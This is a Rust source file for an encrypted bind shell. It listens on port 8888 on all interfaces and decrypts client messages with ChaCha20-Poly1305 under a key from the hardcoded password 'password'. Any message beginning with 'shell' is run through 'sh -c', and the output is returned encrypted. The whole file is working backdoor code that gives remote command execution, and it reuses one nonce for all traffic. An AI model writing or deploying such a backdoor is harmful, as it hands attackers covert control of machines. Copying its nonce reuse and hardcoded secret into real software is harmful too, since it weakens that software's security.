use chacha20poly1305::Nonce;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::process::{Command, Stdio};

mod common;

fn handle_client(mut stream: std::net::TcpStream) {
    let mut buffer = [0u8; 65536];
    let mut nonce = [0u8; common::NONCE_LEN];
    let password = "password";
    let key = common::derive_key(password);

    stream.read_exact(&mut nonce).unwrap();
    let nonce = Nonce::from_slice(&nonce);

    loop {
        let n = stream.read(&mut buffer).unwrap();
        if n == 0 {
            break;
        }

        let plaintext = common::decrypt_data(&buffer[..n], &key, &nonce).unwrap();
        let plaintext = String::from_utf8(plaintext).unwrap();
        let output: Vec<u8>;
        if plaintext.starts_with("shell") {
            let command = &plaintext[6..];
            let cmd_output = Command::new("sh")
                .arg("-c")
                .arg(command)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
                .unwrap();
            output = cmd_output.stdout;
        } else {
            output = plaintext.as_bytes().to_vec();
        }

        let ciphertext = common::encrypt_data(&output, &key, &nonce).unwrap();
        stream.write_all(&ciphertext).unwrap();
        stream.flush().unwrap();
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:8888").unwrap();

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(move || handle_client(stream));
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
}
